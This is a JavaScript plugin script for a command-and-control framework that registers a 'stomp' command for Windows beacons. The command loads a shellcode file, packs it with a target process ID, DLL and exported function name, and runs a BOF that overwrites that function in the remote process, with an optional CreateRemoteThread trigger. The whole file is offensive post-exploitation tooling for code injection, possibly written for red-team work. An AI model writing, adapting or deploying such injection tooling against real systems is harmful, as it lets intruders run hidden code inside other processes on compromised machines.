var metadata = { name: "FuncStomp", description: "Remote function stomping — overwrite an exported function with shellcode", store: true };

var cmd_stomp = ax.create_command("stomp", "Stomp a function in a target process with shellcode",
    "stomp -p <pid> -d <dll> -f <func> -s <shellcode.bin> [-t 1]");
cmd_stomp.addArgFlagInt("-p", "pid", "Target process ID", "0");
cmd_stomp.addArgFlagString("-d", "dll", "DLL module name", "WinUIEdit.dll");
cmd_stomp.addArgFlagString("-f", "func", "Export function name to stomp", "RichEditWndProc");
cmd_stomp.addArgFlagString("-s", "sc", "Path to shellcode .bin file", "C:\\shellcode.bin");
cmd_stomp.addArgFlagInt("-t", "trigger", "CreateRemoteThread: 1=yes 0=no", "0");

cmd_stomp.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parseInt(parsed_json["pid"]) || 0;
    let dll = parsed_json["dll"];
    let func = parsed_json["func"];
    let sc_path = parsed_json["sc"];
    let trigger = parseInt(parsed_json["trigger"]) || 0;

    if (pid <= 0) {
        ax.console_message(id, "Error: -p (pid) is required", "error");
        return;
    }
    if (!dll || !func || !sc_path) {
        ax.console_message(id, "Error: -d, -f, -s are all required", "error");
        return;
    }

    // Read the .bin file from the operator's client disk, base64 encode
    if (!ax.file_exists(sc_path)) {
        ax.console_message(id, "Error: shellcode file not found: " + sc_path, "error");
        return;
    }
    let sc_b64 = ax.encode_file("base64", sc_path);
    if (!sc_b64) {
        ax.console_message(id, "Error: cannot read shellcode file: " + sc_path, "error");
        return;
    }

    let params = ax.bof_pack("int,cstr,cstr,bytes,int", [pid, dll, func, sc_b64, trigger]);
    let bof_path = ax.script_dir() + "_bin/funcstomp." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + params, "Task: FuncStomp");
    ax.console_message(id, "Stomping " + func + " in " + dll + " (PID " + pid + ")...", "info");
});

var group_stomp = ax.create_commands_group("FuncStomp", [cmd_stomp]);
ax.register_commands_group(group_stomp, ["beacon"], ["windows"], []);
